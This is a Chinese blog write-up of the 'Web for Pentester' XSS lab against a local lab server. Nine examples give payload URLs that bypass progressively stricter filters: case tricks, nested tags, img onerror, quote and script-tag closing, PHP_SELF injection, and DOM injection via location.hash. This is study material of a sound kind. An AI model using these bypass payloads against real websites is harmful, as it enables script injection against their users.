---
title: Web for pentest-XSS
comments: false
date: 2016-07-24 23:35:22
categories: 安全
tags: [Web安全,XSS]
---
### example1：
未作任何过滤  
`http://192.168.10.12/xss/example1.php?name=<script>alert('xss')</script>`  
<!--more-->
### example2：

过滤了`<script>`,尝试改变大小写  
`http://192.168.10.12/xss/example2.php?name=<sCRipt>alert('xss')</sCRipt>`

### example3：

过滤了`<script>`,尝试嵌套`<script>`  
`http://192.168.10.12/xss/example3.php?name=<scr<script>ipt>alert('xss')</scr</script>ipt>`

### example4：

多次尝试，发现过滤了script这个单词，无论大小写，尝试使用img标签。  
`http://192.168.10.12/xss/example4.php?name=<img src=1 onerror=alert('xss')>`

### example5：

过滤了alert。  
`http://192.168.10.12/xss/example5.php?name=<script>prompt(1);</script>`
同样可以使用`<script>confirm(1);</script>`或者加载外部js`<script src="http://127.0.0.1/xss.js">`

### example6：

输入`<script>alert('xss')</script>`，查看网页源代码
```
Hello
<script>
	var $a= "<script>alert('xss')</script>";
</script>
```
要先闭合前面的`<script>`,payload如下  
`http://192.168.10.12/xss/example6.php?name=</script><script>alert('123')</script>`

### example7：

输入`<script>alert("xss")</script>`，查看网页源代码
```
<script>
	var $a= '&lt;script&gt;alert('xss')&lt;/script&gt;';
</script>
```

html实体编码  
过滤了尖括号`<>`和`"`,但是输出在`<script>`标签中，只需闭合单引号即可。  
`http://192.168.10.12/xss/example7.php?name=';alert(/xss/);'`


### example8：

输入后，通过POST方式提交给example8.php，过滤了尖括号`<>`和`"`。
不知道怎么做，看了下源码。
```
if (isset($_POST["name"])) {
	echo "HELLO ".htmlentities($_POST["name"]);
}
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
Your name:<input type="text" name="name" />
<input type="submit" name="submit"/>
```
开始只以为输入在查询框中，看到了htmlentities，没法绕过。网上搜了下，才注意到`echo $_SERVER['PHP_SELF']`打印当前页面地址，所以输入点在url中,闭合form标签。  
`http://192.168.10.12/xss/example8.php/"><script>alert(1)</script>`

### example9:
`http://192.168.10.d12/xss/example9.php#<script>alert(1)</script>`  
查看源码  
`document.write(location.hash.substring(1)
`  
Location 对象的 hash 属性用于设置或取得 URL 中的锚部分（包括 # 标记），substring截取后面的，不包括#。
